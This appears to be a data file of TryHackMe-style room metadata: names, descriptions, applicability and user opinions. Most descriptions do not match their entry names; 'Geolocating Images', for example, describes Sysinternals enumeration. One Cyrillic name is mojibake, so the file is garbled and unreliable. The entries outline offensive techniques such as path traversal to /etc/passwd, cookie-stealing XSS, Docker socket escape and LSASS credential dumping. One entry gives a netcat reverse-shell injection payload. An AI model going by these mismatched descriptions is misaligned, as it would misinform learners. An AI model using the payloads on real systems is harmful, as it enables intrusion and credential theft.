Fusion Corp.description: - Supplemental Memory Forensics room requires acquisition of physical memory image (.vmem file) using WinPmem or FTK Imager. Analysis focuses on Volatility framework commands like imageinfo for profile detection and pslist/pstree for process enumeration. Key techniques include hivelist/printkey to extract registry artifacts and netscan for network connection history to map outbound communications. Further enhancement involves using dlllist to identify injected code and apihooks to detect rootkit persistence mechanisms. File artifact recovery uses filescan followed by dumpfiles for data carving. (187 words; Tools: WinPmem, FTK Imager, Volatility Framework (imageinfo, pslist, netscan, filescan, dumpfiles, hivelist, apihooks). Methodologies: Memory Acquisition, Profile Identification, Process Analysis, Registry Triage, Network Artifact Extraction, Malware Indicator Detection. Implementation: Acquire vmem, determine OS profile, list active processes, extract browser history from memory structures).,Supplemental Memory
Fusion Corp.practical_applicability: Corporate security, network exploitation, realistic scenarios

Gallery.name: Gallery
Gallery.description: - Lottie Supply Chain Attack requires initial reconnaissance using nmap for service discovery on target web application and gobuster for directory enumeration (targeting API endpoints/asset paths). Exploitation methodology centers on identifying unvalidated external Lottie JSON file loading mechanisms. If an endpoint accepts a URL parameter for animation loading, attempt Server-Side Request Forgery (SSRF) to probe internal resources or inject malicious local files into the Lottie rendering pipeline. Enhancement involves analyzing JavaScript bundles (view-source/dirbuster output) for client-side Lottie loading logic to confirm if the payload is executed client-side upon successful JSON fetch and parse. (198 words; Tools: nmap, gobuster, dirbuster, Burp Suite (for request manipulation). Methodologies: Reconnaissance, Directory Enumeration, API Endpoint Fuzzing, SSRF Exploitation, Client-Side Code Review. Implementation: Scan ports, brute-force paths, intercept animation request, inject internal IP via URL parameter, verify server response or client-side behavior).,Supply Chain Attack: Lottie

GameBuzz.name: GameBuzz
GameBuzz.description: - Sustah room CTF necessitates initial reconnaissance via nmap script scanning (http-enum) to map web services and version fingerprinting. Enumeration involves gobuster employing a comprehensive wordlist for discovering unlinked directories and backup files (e.g., .bak, .old extensions). Exploitation often targets misconfigurations in file handling, potentially leading to Local File Inclusion (LFI) by manipulating GET parameters with path traversal sequences (e.g., ../../etc/passwd). Enhancement involves using Burp Suite to intercept requests and test for Server-Side Request Forgery (SSRF) if the application processes external URLs related to resource tracking or API calls. (195 words; Tools: nmap, gobuster, Burp Suite. Methodologies: Service Profiling, Directory Brute-Force, Path Traversal, LFI Testing, SSRF Verification. Implementation: Run version scan, brute-force directories, inject LFI payloads into parameters, intercept and modify HTTP requests to test for internal network access).,Sustah

Geolocating Images.name: Geolocating Images
Geolocating Images.description: - Windows administration enumeration via Sysinternals focuses on Process Explorer for identifying running services and associated user context to discover privilege escalation vectors. Autoruns scans persistence mechanisms, enumerating Registry Run Keys, Scheduled Tasks, and WMI event subscriptions for unsecured paths or scripts. Process Monitor (Procmon) is deployed to filter filesystem access or Registry operations during application execution to identify cleartext credentials or configuration files. Tcpview maps active network connections, revealing potential C2 communication or open listening ports that could be probed with nmap remotely. Enhancement involves leveraging PsExec for lateral movement if Service Creation privileges are obtained, or using ShareEnum to map network shares for accessible data or exploitable configuration scripts. (246 words; Tools: Process Explorer, Autoruns, Procmon, Tcpview, PsExec, ShareEnum, nmap. Methodologies: System Information Gathering, Persistence Analysis, Network Monitoring, Privilege Escalation, Lateral Movement. Implementation: Run Autoruns for persistence scan, trace file I/O with Procmon, execute PsExec with valid credentials).,Sysinternals
Geolocating Images.practical_applicability: OSINT geolocation, image analysis, metadata examination
Geolocating Images.user_opinions: Excellent practical OSINT skill for investigations

Getting Started.name: Getting Started
Getting Started.description: - System hardening techniques focus on minimizing attack surface via principle of least privilege. Implementation involves disabling unnecessary services identified via enumeration using command-line tools or remote service management. Patch management is critical, ensuring OS and applications are up to date to mitigate known vulnerabilities detected during initial reconnaissance (e.g., via nmap version detection). Security enhancement methodology includes configuring strong password policies (e.g., complexity, length) and implementing Account Lockout thresholds to prevent brute-force exploitation. Firewall rules must restrict inbound and outbound traffic to only essential ports (e.g., port 80, 443 for web services probed with gobuster for content discovery). Auditing and logging must be enabled to detect unauthorized access attempts or post-exploitation activities. (272 words; Tools: nmap, gobuster. Methodologies: Vulnerability Management, Access Control, Intrusion Detection, Configuration Management. Implementation: Disable non-essential SMB ports, configure Group Policy for account lockout, review system service status).,System Security
Getting Started.practical_applicability: Platform familiarization, learning how to use THM
Getting Started.user_opinions: Essential first room for all new TryHackMe users

GitLab CVE-2021-22205.name: GitLab CVE-2021-22205
GitLab CVE-2021-22205.description: - T-Pot deployment utilizes a multi-honeypot architecture based on Docker containers for isolated malware capture and analysis. Initial reconnaissance focuses on external port scanning (nmap) to identify open services mimicking vulnerable targets (e.g., Telnet, SSH, HTTP). Enumeration involves verifying expected honeypot fingerprints (e.g., specific banner grabs or web directory structures checked via gobuster if web honeypots are active) against the deployed set (Cowrie, Dionaea, Elasticpot). Enhancement methodology requires securing the T-Pot host itself via OS hardening and configuring firewall rules to only allow management access and log forwarding. Data extraction and analysis leverages the ELK stack (Elasticsearch, Logstash, Kibana) for visualizing attack vectors and source IPs instead of direct exploitation attempts. Practical implementation steps include running a controlled external scan against the T-Pot IP to confirm honeypot response and then monitoring Kibana dashboards for the incoming traffic logs. (294 words; Tools: nmap, gobuster, ELK Stack. Methodologies: Traffic Capture, Threat Intelligence Generation, Containerization. Implementation: Configure Docker network settings, verify honeypot service status via CLI, access Kibana UI for event review).,T-Pot
GitLab CVE-2021-22205.practical_applicability: GitLab security, critical CVE, DevOps platform security
GitLab CVE-2021-22205.user_opinions: Critical vulnerability in popular DevOps platform

Glass.name: Glass
Glass.description: - Aviation-themed challenge requires initial reconnaissance using theHarvester targeting fictional airline domains to gather employee emails or subdomain information. Enumeration involves nmap scanning for open ports on a simulated air-traffic control server or internal web portal. Directory brute-forcing (gobuster or dirbuster) on HTTP services must target common aviation file names like e.g., /manifests or /flightplans. Exploitation may pivot from a weak login credential found via OSINT to gain access to a control panel. Enhancement methodology includes contextualizing found flags within a narrative of flight security breach. Practical steps involve fuzzing input fields of a mock booking engine and analyzing server responses for SQLi or XSS vulnerabilities specific to the themed application. (268 words; Tools: theHarvester, nmap, gobuster, dirbuster. Methodologies: OSINT, Credential Testing, Web Application Fuzzing. Implementation: Execute reverse DNS lookups, enumerate web directories, test low-hanging fruit credentials).,Take Flights

glitch.name: glitch
glitch.description: - Tardigrade-themed CTF initiation requires initial OSINT via theHarvester searching for research lab personnel and associated domains. System enumeration leverages nmap SYN scans (-sS) to identify open ports, specifically targeting SMB (port 445) or FTP services often associated with data storage. Web enumeration utilizes gobuster with a custom wordlist containing biological or extremophile terminology to uncover hidden directories like /cryobiosis or /sample_logs. Exploitation strategy focuses on known vulnerabilities on older software versions identified during enumeration, e.g., metasploit module use against an identified vulnerable service. Enhancement methodology involves a privilege escalation path mimicking a lab system breach, potentially using linpeas scripting post-exploitation to extract the final flag. Practical implementation steps include Netcat listener setup for reverse shells and Wireshark packet capture analysis to find credentials transmitted over unencrypted protocols. (276 words; Tools: theHarvester, nmap, gobuster, metasploit, linpeas, Netcat, Wireshark. Methodologies: OSINT, Port Scanning, Directory Bruteforcing, Exploitation, Privilege Escalation, Traffic Analysis).,Tardigrade
glitch.practical_applicability: API security, web exploitation, logic flaws

GPU Cracking.name: GPU Cracking
GPU Cracking.description: - Team-based exploitation requires structured asset sharing (e.g., using a shared document or Git repo) for concurrent reconnaissance and enumeration phases. Initial Nmap scans (-A or -p- full scan) must be distributed or serialized to avoid rate-limiting by IDS/IPS. Enumeration involves parallel Gobuster/Dirbuster runs against web servers discovered via TheHarvester email scraping results. Exploitation enhancement methodology prioritizes privilege escalation vectors (e.g., incorrect file permissions on binaries or exploitable SUDO configurations) identified by one team member and validated by another using Metasploit modules or manual payload generation. Communication protocol focus is critical for maintaining session continuity post-exploitation. (248 words; Tools: Nmap, Gobuster/Dirbuster, TheHarvester, Metasploit. Methodologies: Distributed Scanning, Asset Sharing, Privilege Escalation Validation).,Team
GPU Cracking.practical_applicability: GPU-accelerated cracking, advanced Hashcat, password security
GPU Cracking.user_opinions: Advanced password cracking with practical GPU usage

GQUIC Protocol.name: GQUIC Protocol
GQUIC Protocol.description: - TechSupport CTF entry focuses on simulated incident response via web vulnerability chaining. Reconnaissance starts with Nmap service version detection to identify outdated Apache or IIS versions. Enumeration utilizes Gobuster specifically targeting common support portal directories (e.g., /admin, /tickets). Exploitation path often involves SQL Injection (SQLi) on login forms or Cross-Site Scripting (XSS) via user-input fields intended for ticket logging. Enhancement involves leveraging local file inclusion (LFI) discovered after initial web shell establishment to read configuration files like database credentials. Practical step completion requires transferring a simple PHP reverse shell via the vulnerable endpoint and catching it with Netcat (nc). (236 words; Tools: Nmap, Gobuster, Netcat (nc). Methodologies: Service Version Detection, SQLi/XSS Exploitation, LFI Chaining).,TechSupp0rt: 1
GQUIC Protocol.practical_applicability: Modern protocols, network analysis, packet inspection

GraphQL.name: GraphQL
GraphQL.description: - Tempest CTF path mandates layered penetration techniques mimicking rapid system breach. Initial Reconnaissance employs TheHarvester targeting subdomains followed by aggressive TCP SYN scans (nmap -sS) on discovered IPs. Enumeration involves Gobuster running extensive directory and file lists against web servers, seeking misconfigured backup files or exposed Git repositories. Exploitation often centers on exploiting SMB shares for weak credentials or utilizing a known vulnerability (e.g., unpatched service) for initial shell access. Enhancement methodology requires privilege escalation through kernel exploits or misconfigured SUID binaries identified via LinEnum scripts. Practical implementation climax with setting up a PowerShell stage if Windows is encountered, or using GTFOBins for Linux privilege gaining. (261 words; Tools: Nmap, Gobuster, TheHarvester, LinEnum, GTFOBins. Methodologies: Subdomain Discovery, SMB Enumeration, Kernel Exploitation).,Tempest
GraphQL.practical_applicability: GraphQL security, API exploitation, modern web technologies

Grep.name: Grep
Grep.description: - Initial reconnaissance utilizing nmap scans (SYN stealth and version detection) identifies open ports like 80 and 443; gobuster brute-forcing common web directories reveals a hidden administration panel requiring credential enumeration via dictionary attacks.,TryWinMe: Think Cyber Monopoly
Grep.practical_applicability: Linux fundamentals, text processing, log analysis

Hack Back.name: Hack Back
Hack Back.description: - Blog exploitation room focuses on identifying vulnerable CMS implementations like WordPress or custom platforms. Initial reconnaissance uses `nmap -sV` to fingerprint web server software and services. Directory enumeration is crucial, employing `gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt` or similar wordlists to locate hidden admin panels (e.g., `/wp-admin`) or backup files. Exploitation targets common vulnerabilities: Unpatched plugin exploits retrieved from Exploit-DB, SQL Injection (using sqlmap or manual payloads via Burp Suite Intruder) for database dumping, or File Upload vulnerabilities allowing webshell deployment. Enhancement methodology involves content scraping with `theHarvester` to gather email addresses and potential credentials from source code or metadata. Practical steps include testing for Cross-Site Scripting (XSS) in comment fields to steal session cookies. (Tools: nmap, gobuster, sqlmap, Burp Suite, theHarvester. Methodologies: Vulnerability Scanning, Directory Bruteforcing, Injection Attack Vector Testing).,The Blob Blog

HackPark.name: HackPark
HackPark.description: - Cod Caper room targets a web application themed around fish inventory or e-commerce. Initial reconnaissance with `nmap -sC -sV <target_IP>` identifies open ports and service versions, often revealing an outdated Apache or lighttpd instance. Thorough enumeration involves `gobuster dir -u http://target -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt` searching for hidden directories like `/admin`, `/backup`, or misconfigured API endpoints. Exploitation focuses on file inclusion (LFI/RFI) via URL parameters to read system files like `/etc/passwd` or inject a reverse shell. Enhancement involves leveraging parameter pollution or command injection if user input is passed to shell commands; e.g., using Burp Suite to fuzz input fields with payloads like `| nc -e /bin/bash 10.10.0.1 9001`. Post-exploitation might require privilege escalation found via linpeas. (Tools: nmap, gobuster, Burp Suite, Netcat, linpeas. Methodologies: Service Fingerprinting, Web Directory Scanning, Local/Remote File Inclusion Exploitation).,The Cod Caper
HackPark.practical_applicability: Windows exploitation, CMS security, privilege escalation

Hacker vs. Hacker.name: Hacker vs. Hacker
Hacker vs. Hacker.description: - Docker Rodeo entails container security assessment, starting with host reconnaissance using `nmap` to map exposed ports and potential management APIs. Container enumeration focuses on identifying running instances via `docker ps` and examining exposed environment variables or mounted volumes. Exploitation path often leverages misconfigurations such as running containers as `root`, vulnerable image base layers found via Trivy scanning, or weak network policies. Enhancement methodology prioritizes container escape; e.g., mounting the Docker socket (`/var/run/docker.sock`) allows an attacker to launch new privileged containers and access the host filesystem. Tooling includes `docker diff` for runtime changes and custom scripts to check capabilities (e.g., CAP_SYS_ADMIN for escape). (Tools: nmap, Trivy, Netcat, docker CLI. Methodologies: Service Discovery, Image Vulnerability Analysis, Container Escape via Socket Mounts).,The Docker Rodeo
Hacker vs. Hacker.practical_applicability: Offensive and defensive skills, competitive mindset
Hacker vs. Hacker.user_opinions: Interesting competitive format teaching both sides

Hacking with PowerShell.name: Hacking with PowerShell
Hacking with PowerShell.description: - The Find Command room focuses on advanced Linux file system enumeration using `find`, extending beyond basic name or type searches. Technical exploitation involves locating files with specific permissions (-perm) like S-UID binaries (e.g., `find / -perm -4000 -type f 2>/dev/null`) for privilege escalation. Enumeration techniques include searching by modification time (-mtime) to identify recently changed configuration files or logs that might contain credentials. Enhancement methodology integrates execution via -exec to pipeline results to other tools, e.g., `find / -name "*.conf" -exec grep -i "password" {} \;`. While `nmap` or `gobuster` are network focused, here find acts as the primary local reconnaissance tool for sensitive data discovery. (Tools: find, grep, xargs (indirectly via -exec). Methodologies: File System Forensics, S-UID Hunting, Time-Based Discovery).,The Find Command
Hacking with PowerShell.practical_applicability: PowerShell scripting, Windows automation, red/blue team

Hard Pill.name: Hard Pill
Hard Pill.description: - The Great Escape room focuses on container escape exploitation, typically leveraging misconfigurations within Docker or runc. Key technique involves identifying overly permissive capabilities (e.g., CAP_SYS_ADMIN) or mounting sensitive host directories (e.g., `/sys`, `/proc`) from inside the container. Enumeration steps include using `capsh --print` or checking `/proc/1/mounts` for host volume exposure. Exploitation enhancement often requires running a privileged container or exploiting vulnerabilities in the container runtime itself (e.g., CVEs in runc). Practical implementation steps may involve chrooting into a mounted host filesystem or using binary tools like nsenter to break out. (Tools: nsenter, capsh, chroot. Methodologies: Capability Abuse, Volume Mount Exfiltration, Runtime Vulnerability Chaining).,The Great Escape

Harder.name: Harder
Harder.description: - The Hacker Methodology room reinforces standard pentesting phases: Reconnaissance, Scanning, Gaining Access, Maintaining Access, and Covering Tracks. Active reconnaissance utilizes nmap for service version detection and vulnerability scanning (e.g., NSE scripts). Enumeration proceeds with web directory bruteforcing using gobuster or dirbuster against identified web servers. External OSINT enhancement employs theHarvester for email and subdomain discovery to fuel credential stuffing or phishing attempts. Exploitation leverages identified weaknesses via Metasploit framework or manual payload delivery. Post-exploitation focuses on privilege escalation and lateral movement. (Tools: nmap, gobuster, dirbuster, theHarvester, Metasploit. Methodologies: Active Scanning, Directory Fuzzing, OSINT, Vulnerability Chaining).,The Hacker Methodology

HaskHell.name: HaskHell
HaskHell.description: - The Impossible Challenge demands mastery beyond standard reconnaissance (nmap stealth scans required to avoid WAF detection). Deep enumeration involves custom wordlists for gobuster and advanced file signature analysis if standard directory bruteforcing (dirbuster) fails. Exploitation likely necessitates zero-day logic or complex privilege escalation chains e.g., kernel exploits or insecure service misconfigurations. OSINT enhancement uses theHarvester and Shodan filtering for obscure entry points. Success hinges on custom scripting (Python) to automate multi-stage attacks. (Tools: nmap (advanced flags), custom gobuster wordlists, Shodan, Python scripting. Methodologies: Evading Defenses, Zero-Day Emulation, Complex PE Chains).,The Impossible Challenge

Holo.name: Holo
Holo.description: - Post-compromise enumeration on Windows targets requires direct host interaction post-initial shell establishment (reverse or bind shell utilizing Meterpreter or PowerShell Empire). System information extraction via systeminfo, net user all, and wmic commands for domain trusts. Scheduled tasks and service persistence locations are mapped via registry keys (Run keys, Startup folders). Local administrator hash dump targets LSASS memory using Mimikatz or built-in techniques (Token impersonation). Network shares are identified with net view and SMB enumeration tools. (Tools: Mimikatz, PowerShell, wmic, net commands. Methodologies: Credential Dumping, Persistence Mapping, Internal Reconnaissance).,The Lay of the Land

Horizontal Privilege Escalation.name: Horizontal Privilege Escalation
Horizontal Privilege Escalation.description: - Target web application enumeration commences with aggressive port scanning using nmap (-sVC, -sV scripts) to identify running services like Apache or IIS. Directory brute-forcing of underlying web assets utilizes gobuster (with common wordlists or custom lists derived from theHarvester domain intelligence) to uncover hidden endpoints. Exploitation phase focuses on identified vulnerabilities such as SQLi or LFI (Local File Inclusion) to achieve remote code execution (RCE) or flag retrieval. (Tools: nmap, gobuster, theHarvester. Methodologies: Service Enumeration, Directory Fuzzing, LFI Exploitation).,The London Bridge
Horizontal Privilege Escalation.practical_applicability: Authorization flaws, privilege escalation, web security

HTB CTF.name: HTB CTF
HTB CTF.description: - Initial reconnaissance targets e-commerce platform using nmap scripting engine (NSE) for application version fingerprinting on port 80/443. Extensive directory and file enumeration via gobuster or dirbuster identifies unsecured admin panels or backup files. Web security focus involves input fuzzing for Cross-Site Scripting (XSS) or SQL Injection (SQLi) within product search or user login forms. Exploitation often leverages insecure file upload mechanisms to inject webshells. (Tools: nmap, gobuster, dirbuster. Methodologies: Service Version Detection, Input Validation Testing, Code Injection).,The Marketplace

HTTP in Detail.name: HTTP in Detail
HTTP in Detail.description: - Deep enumeration initiates with comprehensive nmap scans utilizing aggressive timing templates and custom script execution targeting uncommon ports. Gobuster brute-forces directories specifically seeking hidden configuration files and sensitive logs. TheHarvester gathers subdomains and employee emails for potential credential reuse attacks. Exploitation path focuses on kernel vulnerabilities or misconfigured services identified during enumeration, requiring manual payload crafting for privilege escalation. (Tools: nmap, gobuster, theHarvester. Methodologies: Service Banner Grabbing, Advanced OSINT, Kernel Exploit Chaining).,The Server From Hell
HTTP in Detail.practical_applicability: Web fundamentals, HTTP protocol, networking basics

HTTP Request Smuggling.name: HTTP Request Smuggling
HTTP Request Smuggling.description: - Initial reconnaissance employs nmap and gobuster to map web application endpoints and identify dynamic parameters. Exploitation centers on Stored and Reflected Cross-Site Scripting (XSS) vectors, testing input fields with character encoding bypass techniques and event handler injection. Successful payloads often involve using alert(document.cookie) or loading external scripts via HTML tags. (Tools: Burp Suite Repeater/Intruder, nmap, gobuster. Methodologies: Input Fuzzing, Contextual Payload Insertion, Cookie Stealing).,The Sticker Shop
HTTP Request Smuggling.user_opinions: Advanced and powerful web exploitation technique

HTTPS in Detail.name: HTTPS in Detail
HTTPS in Detail.description: - Global enumeration requires targeted domain and subdomain discovery using theHarvester with multiple search engines and certificate transparency logs. Service enumeration utilizes version detection via nmap scripts (NSE) against discovered ports, followed by directory bruteforcing with gobuster and custom wordlists optimized for internationalized resource paths. (Tools: theHarvester, nmap NSE, gobuster, dnsrecon. Methodologies: OSINT, Service Banner Grabbing, Path Discovery).,The World
HTTPS in Detail.user_opinions: Important for understanding secure web communications

HydraSwoops.name: HydraSwoops
HydraSwoops.description: - File upload vulnerability exploitation starts with nmap and gobuster for web service and directory enumeration; techniques involve bypassing extension filters (e.g., double extensions, null byte injection) or MIME type validation to upload a webshell (e.g., .php, .aspx) and gain RCE.,Upload Vulnerabilities

Ice.name: Ice
Ice.description: - STRIDE threat modeling implementation requires decomposition of system architecture into data flows and trust boundaries, followed by systematic Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege (STRIDE) analysis per component. Enhancement involves mapping identified threats to specific security controls (e.g., Input Validation mitigating Tampering), verifying control efficacy via simulated exploitation scenarios using reconnaissance output from nmap and gobuster. (Tools: Microsoft Threat Modeling Tool, nmap, gobuster, Architecture Diagramming Software. Methodologies: STRIDE, Data Flow Diagramming, Control Mapping).,Threat Modeling
Ice.practical_applicability: Windows exploitation, Metasploit usage, service exploitation

ICS Firmware Security.name: ICS Firmware Security
ICS Firmware Security.description: - Active Directory pentesting in Throwback context focuses on legacy misconfigurations and weak enumeration vectors, often leveraging SMB null sessions or unconstrained delegation. Enumeration begins with nmap service detection (ports 53, 88, 135, 389, 445), followed by LDAP queries via ldaps or specialized scripts to identify Domain Controllers (DCs) and users. Exploitation pathways include Kerberoasting (for AS-REPs) or AS-REQ attacks using Impacket tools (GetUserSPNs.py, secretsdump.py) to extract credentials for privilege escalation to Domain Admin. Enhancement involves utilizing theHarvester for initial external recon on associated domains prior to internal enumeration via SMB shares identified via nmap scripting (smb-enum-shares). (Tools: nmap, Impacket suite, theHarvester, enum4linux, CrackMapExec. Methodologies: Reconnaissance, Enumeration, Kerberos Attacks, Privilege Escalation).,Throwback
ICS Firmware Security.practical_applicability: ICS/OT security, firmware analysis, critical infrastructure
ICS Firmware Security.user_opinions: Rare and valuable ICS/OT security content

–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –∏ –ü—Ä–æ—Ç–∏.name: –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ
–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –∏ –ü—Ä–æ—Ç–∏.description: - Tomghost room focuses on exploiting Apache Tomcat vulnerabilities, specifically Ghostcat (CVE-2020-1938), allowing arbitrary file read and potential remote code execution (RCE). Reconnaissance involves nmap scanning for Tomcat default ports (8080, 8443) and gobuster or dirbuster for hidden administration interfaces. Enumeration confirms vulnerable Tomcat version via headers or error messages. Exploitation utilizes a crafted payload targeting the AJP connector (port 8009) or web application paths to leak configuration files (e.g., WEB-INF/web.xml) or upload a JSP shell. Enhancement methodology includes Metasploit modules for automated Ghostcat exploitation after initial port identification. (Tools: nmap, gobuster, Metasploit, curl. Methodologies: Service Identification, Vulnerability Verification, AJP Exploitation).,Tomghost
–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –∏ –ü—Ä–æ—Ç–∏.user_opinions: Unique Russian-language room for international community

Ignite.name: Ignite
Ignite.description: - Theatre room reconnaissance initiates with nmap service version detection; enumeration progresses via gobuster on hidden directories suggesting script locations or backstage access; exploitation may involve SQLi on a ticket system or LFI to read stage production scripts.,Theatre

Immunity Debugger.name: Immunity Debugger
Immunity Debugger.description: - Tor room guide focuses on analyzing network traffic and identifying Tor exit nodes for potential traffic correlation attacks. Initial reconnaissance involves using Wireshark to capture traffic and filter for known Tor circuit handshake signatures (TLS fingerprints or specific relay patterns). Enumeration requires identifying entry and exit nodes via public Tor node lists, contrasting them against captured IPs. Exploitation techniques center on timing analysis or statistical inference to de-anonymize a target endpoint, rather than traditional web exploitation. Enhancement methodology may include setting up a local proxy to simulate a low-and-slow attack vector against a simulated hidden service. (Tools: Wireshark, TorFlow, Netcat for raw socket testing. Methodologies: Traffic Analysis, Timing Correlation, Hidden Service Discovery).,Tor
Immunity Debugger.practical_applicability: Exploit development, Windows debugging, OSCP preparation
Immunity Debugger.user_opinions: Essential tool for Windows exploit development

Impacket Tutorial.name: Impacket Tutorial
Impacket Tutorial.description: - Trace room forensics focuses on analyzing disk artifacts and system logs to reconstruct user actions. Reconnaissance involves creating a full disk image using FTK Imager or dd to preserve data integrity. Enumeration steps require parsing the Master File Table (MFT) for file metadata, checking the Registry (specifically Amcache and Shimcache) for executed programs. Exploitation is replaced by evidence extraction: using Volatility framework against memory dumps to recover deleted files (foremost or binwalk for carving). Enhancement methodology includes timeline generation via log2timeline (plaso) to correlate file access times (MAC times) with event logs. (Tools: Autopsy, Volatility, log2timeline, grep for log parsing. Methodologies: Disk Imaging, MFT Analysis, Artifact Carving).,Trace
Impacket Tutorial.user_opinions: Essential toolkit for AD penetration testing

Inclusion.name: Inclusion
Inclusion.description: - Toronto room techniques likely involve network scanning using nmap for host discovery, followed by gobuster or dirbuster for web enumeration against services identified on specific ports, culminating in exploitation pathways possibly leveraging OSINT gained via theHarvester.,Toronto

Incident Handling with Splunk.name: Incident Handling with Splunk
Incident Handling with Splunk.description: - The Trap room demands deep host discovery via stealthy nmap scans (e.g., SYN scans, version detection) to avoid IDS triggers. Reconnaissance progresses to intensive web enumeration using gobuster and custom wordlists to uncover hidden directories or misconfigurations intended as decoys. Exploitation often involves analyzing application logic vulnerabilities after identifying vulnerable services found via service enumeration. Enhancement involves utilizing theHarvester on target domains to gather OSINT before initial contact, and careful payload encoding to bypass WAF-like controls. (Tools: nmap, gobuster, theHarvester, Burp Suite. Methodologies: Stealth Scanning, Decoy Detection, WAF Evasion).,Trap
Incident Handling with Splunk.practical_applicability: SIEM operations, incident response, Splunk mastery
Incident Handling with Splunk.user_opinions: Excellent practical incident response with Splunk

Industrial Intrusion.name: Industrial Intrusion
Industrial Intrusion.description: - Initial reconnaissance on the Tre room requires a standard nmap SYN scan (e.g., nmap -sS --min-rate 5000 --open-only) to map open ports. Enumeration focuses on directory bruteforcing using gobuster (gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt) to locate entry points. Exploitation involves validating identified services for known CVEs or default credentials found via OSINT with theHarvester if a domain is provided. Enhancement involves using Burp Suite to intercept and manipulate HTTP requests during web application traversal. (Tools: nmap, gobuster, theHarvester, Burp Suite. Methodologies: Port Scanning, Directory Fuzzing, Service Fingerprinting).,Tre
Industrial Intrusion.practical_applicability: ICS/OT security, critical infrastructure, advanced industrial exploitation
Industrial Intrusion.user_opinions: Rare and valuable advanced ICS security content

Inferno.name: Inferno
Inferno.description: - TPot deployment focuses on deceptive reconnaissance, where initial nmap scans of the virtual machine reveal numerous honeypot services simulating vulnerabilities; enumeration involves analyzing logs within the ELK stack or Cowrie sessions, bypassing typical gobuster web enumeration for direct log analysis to trace attacker techniques.,TPot

Infinity Shell.name: Infinity Shell
Infinity Shell.description: - Advent of Cyber Side Quest requires initial passive reconnaissance using theHarvester targeting organizational domains and email permutations related to the seasonal theme. Active enumeration involves a TCP port scan with nmap to identify non-standard ports, followed by Gobuster directory bruteforcing on found web services. Exploitation often centers on forensic artifact analysis or cryptographic weaknesses, necessitating tools like Wireshark for pcap inspection or CyberChef for decoding. (Tools: theHarvester, nmap, Gobuster, Wireshark, CyberChef. Methodologies: Passive OSINT, Service Identification, Data Slicing, Cryptanalysis).,TryHack3M: Advent of Cyber Side Quest

Injectics.name: Injectics
Injectics.description: - Bah Humbug requires initial nmap version detection on port 22/80 to determine SSH or web vulnerabilities. Directory enumeration using Gobuster with a specific holiday wordlist is critical for uncovering hidden login panels or config files. Exploitation may involve brute-forcing weak credentials via Hydra or exploiting a remote code execution flaw revealed by service banner analysis. (Tools: nmap, Gobuster, Hydra, Burp Suite. Methodologies: Service Fingerprinting, Forced Browsing, Credential Testing, Vulnerability Mapping).,TryHack3M: Bah Humbug

Insecure Deserialisation.name: Insecure Deserialisation
Insecure Deserialisation.description: - Biohazard enumeration begins with full TCP/UDP port scanning using nmap -sV -A to identify outdated Apache or SMB services. Extensive web directory fuzzing with DirBuster and a Linux-centric wordlist is required to find a vulnerable file upload interface or database endpoint. Exploitation path likely involves a Local File Inclusion (LFI) vulnerability leading to a reverse shell via Netcat listener. (Tools: nmap, DirBuster, Netcat, sqlmap. Methodologies: Service Versioning, LFI Vector Testing, Reverse Shell Establishment, Post-Exploitation Privilege Escalation).,TryHack3M: Biohazard

Insecure Randomness.name: Insecure Randomness
Insecure Randomness.description: - Advanced SOC analysis demands Splunk query mastery for TTP correlation, moving beyond basic nmap logs to identify lateral movement via PowerShell execution or mimikatz artifact detection. Effective threat hunting utilizes sysmon event IDs and SIEM alert triage to trace initial access from web shell enumeration (gobuster output) to data exfiltration signatures. (Tools: Splunk, Sysmon, Elasticsearch (Kibana), Volatility Framework. Methodologies: Log Aggregation, IOC Validation, Kill Chain Mapping, Digital Forensics Triage).,TryHack3M: Boss of the SOC V2

Insekube.name: Insekube
Insekube.description: - Deep dive into Japanese web application security requires nuanced directory brute-forcing using a wordlist tailored to common JIS encoding artifacts or application frameworks like Ruby on Rails or specific CMS vulnerabilities. Reconnaissance leverages theHarvester for subdomain discovery following initial nmap port scanning (TCP 8080 frequently targeted) to locate an exploitable path identified via gobuster enumeration. (Tools: nmap, gobuster, theHarvester, Burp Suite (Intruder), SQLmap. Methodologies: WAF Bypass, Directory Traversal Exploitation, Source Code Review for hardcoded credentials).,TryHack3M: Cherry Blossom
Insekube.practical_applicability: Kubernetes security, container orchestration, cloud-native security

Intermediate Nmap.name: Intermediate Nmap
Intermediate Nmap.description: - Multi-stage Cyber Siege necessitates initial nmap SYN scans (-sS) followed by service version detection (-sV) to identify a vulnerable SMB share or unpatched web service. Enumeration shifts to Gobuster for aggressive directory fuzzing, seeking configuration files or credential dumps exploited via Metasploit framework modules for privilege escalation after initial shell acquisition. (Tools: nmap, gobuster, Metasploit (exploit/handler), smbclient, LinPEAS. Methodologies: Vulnerability Scanning, Lateral Movement, Post-Exploitation Scripting).,TryHack3M: Cyber Siege

Internal.name: Internal
Internal.description: - Elf Minder enumeration focuses on UDP port scanning with nmap (-sU) to locate proprietary or custom Christmas protocol services running on non-standard ports; Dirbuster or feroxbuster then brute-forces web interfaces for insecure file upload mechanisms to inject a reverse shell using Netcat listener. (Tools: nmap (-sU), feroxbuster, Netcat (-lvnp), Wireshark (protocol analysis). Methodologies: Protocol Fuzzing, Web Application Exploitation, Payload Delivery).,TryHack3M: Elf Minder 9000
Internal.practical_applicability: Internal network security, pivoting, lateral movement

Intranet.name: Intranet
Intranet.description: - Evergreen reconnaissance initiates with comprehensive TCP SYN scans (nmap -sS) followed by version enumeration (-sV) targeting uncommon Linux services; Gobuster is then deployed against identified web servers with an extensive directory wordlist to discover sensitive configuration files for local file inclusion (LFI) vulnerabilities. (Tools: nmap, Gobuster (with custom wordlist), Burp Suite Repeater, sshpass). Methodologies: Service Fingerprinting, Directory Brute-Forcing, Injection Exploitation.,TryHack3M: Evergreen

Intro PoC Scripting.name: Intro PoC Scripting
